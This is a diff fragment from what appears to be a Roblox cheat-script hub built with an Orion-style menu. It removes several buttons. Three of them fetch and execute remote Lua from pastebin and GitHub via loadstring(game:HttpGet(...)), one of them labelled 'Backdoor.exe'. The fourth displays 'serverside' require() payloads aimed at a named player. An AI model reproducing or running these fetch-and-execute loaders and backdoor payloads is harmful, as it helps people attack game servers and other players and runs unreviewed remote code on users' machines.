@@ -329,32 +329,3 @@ MIA:AddButton({
         warn("fuck")
   	end    
 })
-MIA:AddButton({
-	Name = "Toolspam",
-	Callback = function()
-        loadstring(game:HttpGet(('https://pastebin.com/raw/D5FuHPdb'),true))()
-  	end    
-})
-MIA:AddButton({
-	Name = "Replication GUI",
-	Callback = function()
-        loadstring(game:HttpGet(('https://github.com/NotAVeryGoodName/scripts/raw/main/ReplicG.lua'),true))()
-  	end    
-})
-MIA:AddButton({
-	Name = "Backdoor.exe",
-	Callback = function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
-  	end    
-})
-MIA:AddButton({
-	Name = "Serversides",
-	Callback = function()
-        OrionLib:MakeNotification({
-            Name = "Kille em",
-            Content = "require(0x22EEC35B5)["load"]("NAMEHERE") || require(8571335826).miaispoopoo("NAMEHERE")",
-            Image = "rbxassetid://4384402433",
-            Time = 30
-        })		
-  	end    
-})
